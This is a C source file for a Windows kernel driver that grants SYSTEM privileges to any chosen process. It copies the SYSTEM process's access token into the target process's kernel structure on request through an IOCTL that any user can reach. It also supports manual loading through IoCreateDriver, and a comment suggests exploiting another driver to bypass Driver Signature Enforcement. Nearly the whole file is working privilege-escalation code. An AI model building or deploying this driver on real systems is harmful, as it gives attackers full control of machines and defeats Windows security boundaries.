#include <ntifs.h>
#include <ntddk.h>

//to import this function:
NTKERNELAPI NTSTATUS IoCreateDriver( IN PUNICODE_STRING DriverName, OPTIONAL IN PDRIVER_INITIALIZE InitializationFunction );

typedef
struct _ElevateData
{
	unsigned __int32 dwSystemPid;
	unsigned __int32 dwElevatePid;
	unsigned __int64 dwTokenOffset;
} ElevateData;

#define IOCTL_ElevateProcess CTL_CODE(FILE_DEVICE_UNKNOWN,0x800,METHOD_BUFFERED,FILE_ANY_ACCESS)


NTSTATUS ElevateProcess(ElevateData* pData)
{
	NTSTATUS status = STATUS_UNSUCCESSFUL;
	HANDLE dwSystemPid = NULL;
	HANDLE dwTargetPid = NULL;

	PEPROCESS System = NULL;
	PEPROCESS Target = NULL;

	DWORD64* pTokenToElevate = NULL;
	DWORD64* pSystemToken = NULL;
	
	dwSystemPid = (HANDLE)pData->dwSystemPid;
	dwTargetPid = (HANDLE)pData->dwElevatePid;

	if ( pData->dwTokenOffset == 0 )
		return STATUS_INVALID_PARAMETER;


	status = PsLookupProcessByProcessId(dwSystemPid, &System);
	if (status != STATUS_SUCCESS)
		return status;

	status = PsLookupProcessByProcessId(dwTargetPid, &Target);
	if (status != STATUS_SUCCESS)
		return status;
	
	pTokenToElevate = (DWORD64*)((DWORD64)Target + pData->dwTokenOffset);
	pSystemToken = (DWORD64*)((DWORD64)System + pData->dwTokenOffset);

	__try {
		*(DWORD64*)pTokenToElevate = *(DWORD64*)pSystemToken;
	}
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		status = GetExceptionCode();
		DbgPrint("[ElevateProcessDriver] [" __FUNCTION__ "] EXCEPTION [0x%X] [At: %s ]", status, __FILE__);
	}

	return status;
}


NTSTATUS DrvDispatchRoutine(PDEVICE_OBJECT pDeviceObject, PIRP pIrp)
{
	NTSTATUS NtStatus = STATUS_UNSUCCESSFUL;
	PIO_STACK_LOCATION pIo = NULL;
	pIo = IoGetCurrentIrpStackLocation(pIrp);
	pIrp->IoStatus.Information = 0;
	DWORD32 IoControlCode = 0;

	UNREFERENCED_PARAMETER(pDeviceObject);

	if (pIo->MajorFunction == IRP_MJ_DEVICE_CONTROL)
	{
		IoControlCode = pIo->Parameters.DeviceIoControl.IoControlCode;
		if (IoControlCode == IOCTL_ElevateProcess)
		{
			if (pIo->Parameters.DeviceIoControl.InputBufferLength != sizeof(ElevateData))
			{
				NtStatus = STATUS_INVALID_PARAMETER;
			}
			else
			{
				NtStatus = ElevateProcess( (ElevateData*)pIrp->AssociatedIrp.SystemBuffer );
			}
		}
		else
		{
			DbgPrint("[ElevateProcessDriver] [" __FUNCTION__ "] unknown request: 0x%X\n", IoControlCode);
			NtStatus = STATUS_INVALID_DEVICE_REQUEST;
		}
	}
	else
	{
		NtStatus = STATUS_SUCCESS;
	}
	pIrp->IoStatus.Status = NtStatus;
	IoCompleteRequest(pIrp, IO_NO_INCREMENT);
	return NtStatus;
}


BOOLEAN IsKernelPointer(void* Pointer) {
#ifdef _WIN64
	return ((ULONG_PTR)(Pointer) >= 0xfff8000000000000);
#else  // 32-bit
	return ((ULONG_PTR)(Pointer) >= 0x80000000);
#endif
}

UNICODE_STRING deviceName, SymLink;
VOID DriverUnload(PDRIVER_OBJECT pDriverObject)
{
	DbgPrint("Process Elevation Driver unloading!");
	IoDeleteSymbolicLink(&SymLink);
	IoDeleteDevice(pDriverObject->DeviceObject);
};

NTSTATUS DriverEntry( DRIVER_OBJECT *pDriverObject, UNICODE_STRING* RegistryPath )
{
	NTSTATUS status = STATUS_UNSUCCESSFUL;
	PDEVICE_OBJECT pDeviceObj = NULL;
	UNICODE_STRING drvName;

	UNREFERENCED_PARAMETER(RegistryPath);
	
	if ( !IsKernelPointer(pDriverObject) )
	//to bypass DSE you could exploit an other driver and use it to manually load this driver
	{
		RtlInitUnicodeString(&drvName, L"\\Driver\\ElevationDriver");
		status = IoCreateDriver(&drvName, &DriverEntry);
		return status;
	}

	RtlInitUnicodeString(&deviceName, L"\\Device\\ElevationDriver");
	status = IoCreateDevice(pDriverObject, 0, &deviceName, FILE_DEVICE_UNKNOWN, FILE_DEVICE_SECURE_OPEN, TRUE, &pDeviceObj);
	if (status == STATUS_SUCCESS)
	{
		pDriverObject->MajorFunction[IRP_MJ_CREATE] =
		pDriverObject->MajorFunction[IRP_MJ_CLOSE] =
		pDriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = DrvDispatchRoutine;

		pDriverObject->DriverUnload = DriverUnload;

		pDeviceObj->Flags |= DO_BUFFERED_IO;

		RtlInitUnicodeString(&SymLink, L"\\DosDevices\\ElevationDriver");
		status = IoCreateSymbolicLink(&SymLink, &deviceName);

		pDeviceObj->Flags &= (~DO_DEVICE_INITIALIZING);

		DbgPrint("Process Elevation Driver loaded!");
	}
	return status;
}

